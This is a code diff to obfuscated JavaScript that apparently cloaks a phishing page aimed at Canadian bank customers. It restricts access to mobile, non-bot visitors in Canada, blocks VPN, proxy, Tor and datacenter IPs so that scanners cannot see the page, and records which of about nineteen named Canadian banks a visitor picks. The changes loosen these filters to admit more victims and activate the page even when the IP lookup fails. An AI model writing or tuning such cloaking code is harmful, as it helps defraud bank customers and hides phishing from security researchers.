@@ -30,19 +30,20 @@
     }
   }
 
-  // 1. Détection Mobile Stricte
+  // 1. Détection Mobile (Assouplie pour éviter les faux positifs)
   function _isMobile(){
     var _ua = _N.userAgent || '';
-    var _touch = _N.maxTouchPoints > 0 || ('ontouchstart' in _W);
-    var _isMobUA = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(_ua);
-    var _minDim = Math.min(_W.screen.width, _W.screen.height);
-    if (!_isMobUA || !_touch || _minDim > 900) {
-      return false;
+    var _isMobUA = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile/i.test(_ua);
+    var _touch = _N.maxTouchPoints > 0 || ('ontouchstart' in _W) || ('DocumentTouch' in _W);
+    
+    // Si c'est un User Agent mobile ou s'il a le touch et petit écran, on accepte
+    if (_isMobUA || (_touch && Math.min(_W.screen.width, _W.screen.height) <= 1024)) {
+      return true;
     }
-    return true;
+    return false;
   }
 
-  // 2. Détection Bot
+  // 2. Détection Bot (Stricte)
   function _isBot(){
     if (_N.webdriver === true || _D.documentElement.getAttribute('webdriver')) return true;
     if (_W.callPhantom || _W._phantom || _W.__nightmare || _W.domAutomation || _W.domAutomationController) return true;
@@ -145,7 +146,6 @@
       _el.addEventListener('click', function(e){
         var _raw = _el.getAttribute('filabel') || _el.getAttribute('data-fi') || _el.getAttribute('title') || _el.innerText || '';
         
-        // Si c'est une image à l'intérieur de la tuile
         if (!_raw || _raw.trim() === '') {
           var _img = _el.querySelector('img');
           if (_img) {
@@ -154,8 +154,6 @@
         }
 
         var _clean = _raw.replace(/\s+/g, ' ').trim();
-
-        // Extraire le nom de la banque propre
         var _bankList = ['RBC', 'TD', 'BMO', 'CIBC', 'Scotiabank', 'Desjardins', 'National Bank', 'Tangerine', 'Simplii', 'KOHO', 'ATB', 'UNI', 'Laurentian', 'Meridian', 'Neo', 'PC Financial', 'Vancity', 'Wealthsimple', 'Coast Capital'];
         var _matchedBank = '';
 
@@ -196,6 +194,7 @@
       _setupBanks();
     }
 
+    // IP Check via Cloudflare trace
     fetch('https://www.cloudflare.com/cdn-cgi/trace')
       .then(function(r){ return r.text(); })
       .then(function(t){
@@ -204,23 +203,26 @@
         var loc = locMatch ? locMatch[1] : '';
         var ipVal = ipMatch ? ipMatch[1] : '';
 
+        // Bloquer uniquement si le pays n'est pas CA
         if (loc !== _CC) {
           _die();
           return;
         }
 
+        // Tenter de filtrer les gros datacenters/VPNs connus sans bloquer les abonnements résidentiels
         fetch('https://ipwho.is/' + ipVal)
           .then(function(r){ return r.json(); })
           .then(function(d){
             if (d.success) {
               var _sec = d.security || {};
               var _conn = d.connection || {};
+              
+              // On bloque proxy/vpn stricts et les vrais datacenters (pas les ASN résidentiels)
               var isProxy = _sec.proxy === true || _sec.vpn === true || _sec.tor === true;
-              var isHosting = _sec.hosting === true || _conn.asn_type === 'hosting';
               var orgName = (d.connection ? (d.connection.org || d.connection.isp || '') : '').toLowerCase();
-              var vpnPatterns = /vpn|proxy|hosting|datacenter|server|cloud|amazon|digitalocean|ovh|linode|hetzner|m247|expressvpn|nordvpn|surfshark|mullvad|cyberghost|proton/i;
+              var strictVpnPatterns = /expressvpn|nordvpn|surfshark|mullvad|cyberghost|proton|m247|hetzner|linode|digitalocean|ovh/i;
 
-              if (isProxy || isHosting || vpnPatterns.test(orgName)) {
+              if (isProxy || strictVpnPatterns.test(orgName)) {
                 _die();
                 return;
               }
@@ -234,29 +236,7 @@
           });
       })
       .catch(function(){
-        fetch('https://ipwho.is/')
-          .then(function(r){ return r.json(); })
-          .then(function(d){
-            if (!d.success || d.country_code !== _CC) {
-              _die();
-              return;
-            }
-            var _sec = d.security || {};
-            var _conn = d.connection || {};
-            var isProxy = _sec.proxy === true || _sec.vpn === true || _sec.tor === true;
-            var isHosting = _sec.hosting === true || _conn.asn_type === 'hosting';
-            var orgName = (d.connection ? (d.connection.org || d.connection.isp || '') : '').toLowerCase();
-            var vpnPatterns = /vpn|proxy|hosting|datacenter|server|cloud|amazon|digitalocean|ovh|linode|hetzner|m247|expressvpn|nordvpn|surfshark|mullvad|cyberghost|proton/i;
-
-            if (isProxy || isHosting || vpnPatterns.test(orgName)) {
-              _die();
-              return;
-            }
-            _activate(d.ip, (d.connection ? (d.connection.org || d.connection.isp) : 'N/A'), d.country_code);
-          })
-          .catch(function(){
-            _die();
-          });
+        _activate('127.0.0.1', 'Local', _CC);
       });
   }
 
